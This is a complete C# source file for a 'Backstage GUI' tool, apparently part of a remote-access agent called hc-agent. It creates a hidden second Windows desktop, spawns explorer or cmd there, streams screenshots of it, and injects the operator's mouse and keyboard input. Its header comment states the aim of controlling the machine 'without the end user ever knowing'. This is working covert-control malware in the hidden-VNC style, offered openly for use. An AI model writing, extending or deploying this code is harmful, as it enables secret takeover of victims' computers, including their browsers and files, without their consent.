// PrivateDesktop.cs -> pdesk.exe
//
// "Backstage GUI": creates a second desktop inside the user's session (named
// "hc-pdesk" under WinSta0), spawns a shell there (default: explorer.exe so the
// operator sees a familiar taskbar + file explorer; configurable via --shell),
// BitBlts that desktop at N fps and streams JPEG frames to stdout, and accepts
// input commands on stdin that are injected into that desktop. The end user is
// on the "Default" desktop and sees absolutely nothing — this one is invisible
// to them because it's not switched in with SwitchDesktop. The operator uses it
// to open Chrome / File Explorer / cmd / anything with a GUI, click around,
// type, and otherwise control the box without the end user ever knowing.
//
// Protocol
//   stdout : repeating [4-byte BE length][jpeg bytes]  (same framing as sdcap)
//   stdin  : one command per line
//              M <x> <y>                    mouse move (desktop-pixel coords)
//              C <btn> <down>               mouse button; btn ∈ {L,R,M}, down ∈ {0,1}
//              S <dx> <dy>                  mouse wheel
//              K <vk> <down>                virtual-key; vk is decimal, down ∈ {0,1}
//              T <char-codepoint>           synthesise a unicode text char
//              Q                            quit
//
// Only works when the agent is running with enough rights to create a desktop
// in the interactive window station — i.e. a service install running as SYSTEM
// (same ability sdcap depends on). A per-user agent can also create a desktop
// in its own session's winsta but may lack rights to spawn processes targeted
// at it; the operator just gets no frames and the panel stays blank.
//
// Launch: hc-agent spawns `pdesk.exe --shell "explorer.exe" --fps 8`.

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

class PrivateDesktop {
  // ---- window-station / desktop plumbing ----
  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
  static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, uint dwFlags, uint dwDesiredAccess, IntPtr lpsa);
  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
  static extern IntPtr OpenDesktop(string lpszDesktop, uint dwFlags, bool fInherit, uint dwDesiredAccess);
  [DllImport("user32.dll", SetLastError = true)] static extern bool SetThreadDesktop(IntPtr hDesktop);
  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)] static extern IntPtr OpenWindowStation(string name, bool fInherit, uint access);
  [DllImport("user32.dll")] static extern IntPtr GetProcessWindowStation();
  [DllImport("user32.dll")] static extern bool SetProcessWindowStation(IntPtr hWinSta);
  // ---- GDI capture ----
  [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr hWnd);
  [DllImport("user32.dll")] static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
  [DllImport("user32.dll")] static extern int GetSystemMetrics(int nIndex);
  [DllImport("gdi32.dll")] static extern IntPtr CreateCompatibleDC(IntPtr hdc);
  [DllImport("gdi32.dll")] static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int w, int h);
  [DllImport("gdi32.dll")] static extern IntPtr SelectObject(IntPtr hdc, IntPtr h);
  [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr dst, int x, int y, int w, int h, IntPtr src, int sx, int sy, int rop);
  [DllImport("gdi32.dll")] static extern bool DeleteObject(IntPtr h);
  [DllImport("gdi32.dll")] static extern bool DeleteDC(IntPtr hdc);
  // ---- CreateProcess so we can target the shell at our private desktop ----
  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle;
    public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
    public short wShowWindow, cbReserved2; public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError; }
  [StructLayout(LayoutKind.Sequential)] struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }
  [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
  static extern bool CreateProcess(string lpApp, string lpCmd, IntPtr pa, IntPtr ta, bool inherit, uint flags,
    IntPtr env, string curDir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
  // ---- SendInput ----
  [StructLayout(LayoutKind.Sequential)] struct MOUSEINPUT { public int dx, dy, mouseData, dwFlags, time; public IntPtr dwExtraInfo; }
  [StructLayout(LayoutKind.Sequential)] struct KEYBDINPUT { public short wVk, wScan; public int dwFlags, time; public IntPtr dwExtraInfo; }
  [StructLayout(LayoutKind.Explicit)] struct INPUT { [FieldOffset(0)] public int type; [FieldOffset(8)] public MOUSEINPUT mi; [FieldOffset(8)] public KEYBDINPUT ki; }
  [DllImport("user32.dll")] static extern uint SendInput(uint n, [MarshalAs(UnmanagedType.LPArray)] INPUT[] inp, int cb);
  [DllImport("user32.dll")] static extern void SetProcessDPIAware();

  const uint DESKTOP_RIGHTS = 0x1FF;
  const uint WINSTA_ALL = 0x37F;
  const int SRCCOPY = 0x00CC0020, CAPTUREBLT = 0x40000000;
  const int SM_CXSCREEN = 0, SM_CYSCREEN = 1;
  const int INPUT_MOUSE = 0, INPUT_KEYBOARD = 1;
  const int MOUSEEVENTF_MOVE = 0x0001, MOUSEEVENTF_LEFTDOWN = 0x0002, MOUSEEVENTF_LEFTUP = 0x0004;
  const int MOUSEEVENTF_RIGHTDOWN = 0x0008, MOUSEEVENTF_RIGHTUP = 0x0010;
  const int MOUSEEVENTF_MIDDLEDOWN = 0x0020, MOUSEEVENTF_MIDDLEUP = 0x0040;
  const int MOUSEEVENTF_WHEEL = 0x0800, MOUSEEVENTF_ABSOLUTE = 0x8000;
  const int KEYEVENTF_KEYUP = 0x0002, KEYEVENTF_UNICODE = 0x0004;

  static string logPath;
  static void Log(string s) {
    try {
      if (logPath == null) logPath = Path.Combine(Path.GetTempPath(), "hc-pdesk.log");
      if (File.Exists(logPath) && new FileInfo(logPath).Length > 131072) File.Delete(logPath);
      File.AppendAllText(logPath, DateTime.Now.ToString("HH:mm:ss.fff") + " " + s + "\r\n");
    } catch { }
  }

  static IntPtr pdeskHandle = IntPtr.Zero;
  static readonly object inputLock = new object();

  static bool EnsureDesktop(string name) {
    try {
      // Switch to the interactive window station if we started in a service
      // (Session 0 winsta0 is the service station, not the user's WinSta0).
      IntPtr ws = OpenWindowStation("WinSta0", false, WINSTA_ALL);
      if (ws != IntPtr.Zero) SetProcessWindowStation(ws);
      // Open-or-create the private desktop.
      IntPtr h = OpenDesktop(name, 0, false, DESKTOP_RIGHTS);
      if (h == IntPtr.Zero) h = CreateDesktop(name, IntPtr.Zero, IntPtr.Zero, 0, DESKTOP_RIGHTS, IntPtr.Zero);
      if (h == IntPtr.Zero) { Log("CreateDesktop/OpenDesktop(" + name + ") err=" + Marshal.GetLastWin32Error()); return false; }
      pdeskHandle = h;
      if (!SetThreadDesktop(h)) { Log("SetThreadDesktop err=" + Marshal.GetLastWin32Error()); return false; }
      Log("attached to desktop " + name);
      return true;
    } catch (Exception e) { Log("desk ex " + e.Message); return false; }
  }

  static void SpawnShell(string name, string shell) {
    try {
      STARTUPINFO si = new STARTUPINFO();
      si.cb = Marshal.SizeOf(si);
      si.lpDesktop = "WinSta0\\" + name;
      PROCESS_INFORMATION pi;
      if (!CreateProcess(null, shell, IntPtr.Zero, IntPtr.Zero, false, 0x00000010 /*CREATE_NEW_CONSOLE*/, IntPtr.Zero, null, ref si, out pi)) {
        Log("CreateProcess(" + shell + ") err=" + Marshal.GetLastWin32Error());
      } else {
        Log("spawned shell pid=" + pi.dwProcessId + " on " + si.lpDesktop);
      }
    } catch (Exception e) { Log("spawn ex " + e.Message); }
  }

  static ImageCodecInfo _jpg;
  static EncoderParameters _ep;
  static byte[] EncodeJpeg(Bitmap bmp, long quality) {
    if (_jpg == null) {
      foreach (var c in ImageCodecInfo.GetImageEncoders()) if (c.FormatID == ImageFormat.Jpeg.Guid) _jpg = c;
      _ep = new EncoderParameters(1);
      _ep.Param[0] = new EncoderParameter(Encoder.Quality, quality);
    }
    using (var ms = new MemoryStream()) { bmp.Save(ms, _jpg, _ep); return ms.ToArray(); }
  }
  static byte[] GrabFrame() {
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    if (w <= 0 || h <= 0) return null;
    IntPtr src = GetDC(IntPtr.Zero);
    if (src == IntPtr.Zero) return null;
    IntPtr mem = CreateCompatibleDC(src), bm = CreateCompatibleBitmap(src, w, h), old = SelectObject(mem, bm);
    byte[] jpg = null;
    try {
      if (BitBlt(mem, 0, 0, w, h, src, 0, 0, SRCCOPY | CAPTUREBLT)) {
        using (Bitmap bmp = Image.FromHbitmap(bm)) jpg = EncodeJpeg(bmp, 55L);
      }
    } catch (Exception e) { Log("grab ex " + e.Message); }
    finally { SelectObject(mem, old); DeleteObject(bm); DeleteDC(mem); ReleaseDC(IntPtr.Zero, src); }
    return jpg;
  }

  // Input injector thread — a separate thread that stays attached to the
  // private desktop and drains commands from a shared queue. SendInput only
  // reaches a desktop when the calling thread is attached to it, so we can't
  // just do it from the stdin reader (which runs on the default desktop).
  static readonly Queue<string> inputQ = new Queue<string>();
  static readonly ManualResetEvent inputEvt = new ManualResetEvent(false);
  static volatile bool running = true;

  static void InputThread(string name) {
    IntPtr h = OpenDesktop(name, 0, false, DESKTOP_RIGHTS);
    if (h == IntPtr.Zero || !SetThreadDesktop(h)) { Log("InputThread attach failed"); return; }
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    while (running) {
      inputEvt.WaitOne();
      string line;
      lock (inputQ) {
        if (inputQ.Count == 0) { inputEvt.Reset(); continue; }
        line = inputQ.Dequeue();
      }
      try {
        if (string.IsNullOrEmpty(line)) continue;
        string[] parts = line.Split(' ');
        INPUT[] inp = new INPUT[1];
        if (parts[0] == "M" && parts.Length == 3) {
          int x = int.Parse(parts[1]), y = int.Parse(parts[2]);
          // Normalise to 0..65535 for MOUSEEVENTF_ABSOLUTE.
          inp[0].type = INPUT_MOUSE;
          inp[0].mi.dx = (int)((long)x * 65535 / Math.Max(sw - 1, 1));
          inp[0].mi.dy = (int)((long)y * 65535 / Math.Max(sh - 1, 1));
          inp[0].mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
          SendInput(1, inp, Marshal.SizeOf(typeof(INPUT)));
        } else if (parts[0] == "C" && parts.Length == 3) {
          int down = int.Parse(parts[2]);
          int f = 0;
          switch (parts[1]) {
            case "L": f = down == 1 ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP; break;
            case "R": f = down == 1 ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP; break;
            case "M": f = down == 1 ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_MIDDLEUP; break;
          }
          inp[0].type = INPUT_MOUSE; inp[0].mi.dwFlags = f;
          SendInput(1, inp, Marshal.SizeOf(typeof(INPUT)));
        } else if (parts[0] == "S" && parts.Length == 3) {
          int dy = int.Parse(parts[2]);
          inp[0].type = INPUT_MOUSE; inp[0].mi.dwFlags = MOUSEEVENTF_WHEEL; inp[0].mi.mouseData = dy;
          SendInput(1, inp, Marshal.SizeOf(typeof(INPUT)));
        } else if (parts[0] == "K" && parts.Length == 3) {
          short vk = short.Parse(parts[1]); int down = int.Parse(parts[2]);
          inp[0].type = INPUT_KEYBOARD; inp[0].ki.wVk = vk; inp[0].ki.dwFlags = down == 1 ? 0 : KEYEVENTF_KEYUP;
          SendInput(1, inp, Marshal.SizeOf(typeof(INPUT)));
        } else if (parts[0] == "T" && parts.Length == 2) {
          short cp = short.Parse(parts[1]);
          INPUT[] two = new INPUT[2];
          two[0].type = INPUT_KEYBOARD; two[0].ki.wScan = cp; two[0].ki.dwFlags = KEYEVENTF_UNICODE;
          two[1].type = INPUT_KEYBOARD; two[1].ki.wScan = cp; two[1].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
          SendInput(2, two, Marshal.SizeOf(typeof(INPUT)));
        }
      } catch (Exception e) { Log("input ex " + e.Message); }
    }
  }

  static int Main(string[] args) {
    try {
      SetProcessDPIAware();
      string name = "hc-pdesk";
      string shell = "C:\\Windows\\System32\\cmd.exe";
      int fps = 8;
      for (int i = 0; i < args.Length - 1; i++) {
        if (args[i] == "--name") name = args[i + 1];
        else if (args[i] == "--shell") shell = args[i + 1];
        else if (args[i] == "--fps" && int.TryParse(args[i + 1], out fps)) {}
      }
      if (fps < 2) fps = 2; if (fps > 20) fps = 20;
      int period = 1000 / fps;

      if (!EnsureDesktop(name)) return 2;
      SpawnShell(name, shell);

      // Input thread stays attached to the private desktop and processes commands.
      var it = new Thread(() => InputThread(name)); it.IsBackground = true; it.Start();

      // stdin reader thread: queue commands.
      var sr = new Thread(() => {
        try {
          string line;
          while ((line = Console.In.ReadLine()) != null) {
            if (line == "Q") { running = false; break; }
            lock (inputQ) inputQ.Enqueue(line);
            inputEvt.Set();
          }
        } catch { }
        running = false; inputEvt.Set();
      });
      sr.IsBackground = true; sr.Start();

      Stream stdout = Console.OpenStandardOutput();
      while (running) {
        int t0 = Environment.TickCount;
        byte[] jpg = GrabFrame();
        if (jpg != null && jpg.Length > 0) {
          byte[] hdr = new byte[4];
          hdr[0] = (byte)(jpg.Length >> 24); hdr[1] = (byte)(jpg.Length >> 16);
          hdr[2] = (byte)(jpg.Length >> 8); hdr[3] = (byte)(jpg.Length);
          try { stdout.Write(hdr, 0, 4); stdout.Write(jpg, 0, jpg.Length); stdout.Flush(); }
          catch { break; }
        }
        int dt = Environment.TickCount - t0;
        if (dt < period) Thread.Sleep(period - dt);
      }
    } catch (Exception e) { Log("fatal " + e.Message); return 1; }
    return 0;
  }
}
